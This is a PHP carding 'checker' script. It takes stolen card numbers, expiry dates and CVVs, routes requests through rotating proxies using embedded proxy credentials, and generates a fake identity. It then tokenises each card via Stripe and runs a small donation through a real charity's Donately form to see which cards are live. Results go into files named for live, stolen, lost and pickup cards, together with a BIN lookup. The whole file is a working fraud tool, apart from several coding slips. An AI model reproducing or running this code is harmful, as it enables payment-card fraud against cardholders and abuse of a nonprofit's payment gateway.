<?php 

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function strposa($haystack, $needles=array(), $offset=0) {
    $chr = array();
    foreach($needles as $needle) {
        $res = strpos($haystack, $needle, $offset);
        if ($res !== false) $chr[$needle] = $res;
    }
    if(empty($chr)) return false;
    return min($chr);
}

if($countmes == 2){
    $mes = substr($mes, 0, 2);
} else {
    $mes = $mes;
}

if (strlen($cc) == 16) {
    $cc1 = substr($cc, 0, 4);
    $cc2 = substr($cc, 4, 4);
    $cc3 = substr($cc, 8, 4);
    $cc4 = substr($cc, 12, 4);
}
if (strlen($cc) == 15) {
    $cc1 = substr($cc, 0, 4);
    $cc2 = substr($cc, 4, 4).' '.substr($cc, 8, 4);
    $cc3 = substr($cc, 12, 4);
}

$countano = strlen($ano);
if($countano == 4){
    $ano = substr($ano, 2, 4);
} else {
    $ano = $ano;
}
function saveCCN($cc) {
$file = dirname(FILE) . "/CCN Lives.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveLive($cc) {
$file = dirname(FILE) . "/Live Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveCVV($cc) {
$file = dirname(FILE) . "/CVV Lives.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveStolenLives($cc) {
$file = dirname(FILE) . "/Stolen Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function savePickupLives($cc) {
$file = dirname(FILE) . "/Pickup Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveLostLives($cc) {
$file = dirname(FILE) . "/Lost Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveZipLives($cc) {
$file = dirname(FILE) . "/Incorrect Zip Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }
function saveInsufficientLives($cc) {
$file = dirname(FILE) . "/Insufficient Fund Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp);}
function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
};
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Webshare = rand(0,10);
$rp1 = array(
  1 => 'npxzxobp-'.$Webshare.':jdosd5c1dyye',
  2 => 'npxzxobp-rotate:jdosd5c1dyye',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
    $ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////====
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


///////////////////////////////////=========[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]=marc+gukki&card[address_line1]=22+ave&card[address_line2]=&card[address_city]=ny&card[address_state]=NY&card[address_zip]='.$postcode.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=53f6ba5a-c254-4240-a0e5-50f18353ea9cb4cb7d&muid=dc08783c-a0fe-4ea9-942b-031f59432c46a22be1&sid=b61e1c12-428d-4f6f-bfd7-8d4ca825f420ad993a&payment_user_agent=stripe.js%2F28708734a%3B+stripe-js-v3%2F28708734a&time_on_page=115357&key=pk_live_51HK3hlKhBnXhXR2oNpPXIkg0SOz5xWXqKHdoneScQU5A8CexpL6Js7WUALBoVMgSJPXDJkkksRoV06x4gj3vthqo00gmf9Cp9k&_stripe_version=2019-02-11&pasted_fields=number');
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resulta = curl_exec($ch);
$chillz = json_decode($resulta, true);
$tok = $chillz['id'];
$country = trim(strip_tags(getStr($resulta,'"country": "','"')));

///////////////////////////////////=========[2nd REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.donately.com/v2/donations.json?account_id=act_de2cd7d90d37&donation_type=cc&x1=41087b4b8f80e899916542139ec1b62b');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"campaign_id":null,"fundraiser_id":null,"dont_send_receipt_email":false,"first_name":"'.$name.'","last_name":"'.$last.'","email":"Andreareleford@yahoo.com","amount_in_cents":200,"currency":"USD","recurring":false,"recurring_frequency":"false","recurring_start_day":"","recurring_stop_day":"","phone_number":"'.$phone.'","street_address":"'.$street.'","street_address_2":"","city":"'.$city.'","state":"'.$state.'","zip_code":"'.$postcode.'","country":"US","comment":"","on_behalf_of":"","anonymous":true,"dump":null,"meta_data":"{}","dtd_data":null,"payment_auth":"{\"stripe_token\":\"'.$tok.'\"}","origin":"https%3A%2F%2Fwww.everybodyathletics.com%2Fdonate-eba","form":"{\"version\":\"4.0.167\",\"id\":\"frm_8426b0d2ddea\"}"}');
$headers = array();
$headers[] = 'Host:api.donately.com';
$headers[] = 'Accept: application/json, text/javascript;';
$headers[] = 'Content-Type: application/json; charset=UTF-8';
$headers[] = 'x-requested-with:XMLHttpRequest';
$headers[] = 'cache-control:no-cache';
$headers[] = 'origin: https://www.everybodyathletics.com';
$headers[] = 'Referer: https://www.everybodyathletics.com/';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resultb = curl_exec($ch);
$mes = trim(strip_tags(getStr($resultb,'"error":"','"')));
$cus = json_decode($resultb, true);
$cus2 = $cus['id'];
////////////////////////////=====[Bank-Information]

function getbnk($bin)
{
 sleep(rand(1,6));
$bin = substr($bin,0,6);
$url = 'http://bins.su';
//  Initiate curl
$ch = curl_init();
// Disable SSL verification
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
// Will return the response, if false it print the response
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// Set the url
curl_setopt($ch, CURLOPT_URL,$url);
// Execute
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
$result=curl_exec($ch);
// Closing
curl_close($ch);

// Will dump a beauty json :3
//var_dump(json_decode($result, true));

if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
{
$r1 = $matches1[1][0];
$r2 = $matches1[2][0];
$r3 = $matches1[3][0];
$r4 = $matches1[4][0];
$r5 = $matches1[5][0];
//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))

 return "$bin|$r2 - $r1 - $r3 - $r4 - $r5";

}
else
{
 return "$bin|Unknown.";
}
}


////////////////////////////===[Card Response]

if (strpos(resultb, '"status":"error"')) { saveCVV(("Live CVV -> $lista $cc|$mes|$ano|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b>- > 🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resultb, '"cvc_check": "pass"')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> -> <b> 🔥 OUTCOME -> cvc_check: '.$cvc.' </span>  </br>';
}elseif (strpos($resultb, 'zip code you supplied failed validation')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i>- > [Code]: '.$mess3.' [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
} elseif (strpos($resultb, "Your card's security code is incorrect.")) { saveCCN(("Live CCN -> $lista $cc|$mes|$ano|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[03]</span> ¤ <span class="text-dark">#CCN</span> -> <span class="text-success"> [ CCN MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i> - > [Code]: '.$code.' [D-Code]: '.$message.' </span> </br>';
} elseif (strpos($resultb, 'Your card has insufficient funds.')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resultb, 'Your card has insufficient funds.')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME [D-Code]: cvc_check: '.$cvc.' </span></br>';
} elseif (strpos($resultb, 'lost_card')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.' </span></br>';
} elseif (strpos($resultb, 'stolen_card')) { saveCVV(("Live CVV -> $lista $cc|$mon|$year|$cvv | Checker Made By 💯ᴀᴜᴅʏᴀ💯"));
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} elseif (strpos($resultb, '"cvc_check": "unavailable"')) {
    echo'<b><span class="badge badge-danger"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [Code]: '.$mess2.' [D-Code]: '.$dcode.' -> cvc_check: '.$cvc.' <b><i></span> </br>';
}elseif (strpos($resultb, 'pickup_card')) {
    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
} 
else {
    echo'<b><span class="badge badge-danger"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [D-Code]: '.$dcode.' -> '.$code.' <b><i></span> </br>';
}

curl_close($ch);
ob_flush();

echo "<b>token Result:</b> $tok<br><br>";
echo "<b>1REQ Result:</b> $resulta<br><br>";
echo "<b>2REQ Result:</b> $resultb<br><br>";
echo "<b>ARXERY STRIPE</b><br><br>";
echo $message
///////////////////////////////////?? ?? ?? ?? ?? ?? ???? [?] & �? cLz ?�??ChillZ ???? ////////////////////////

?>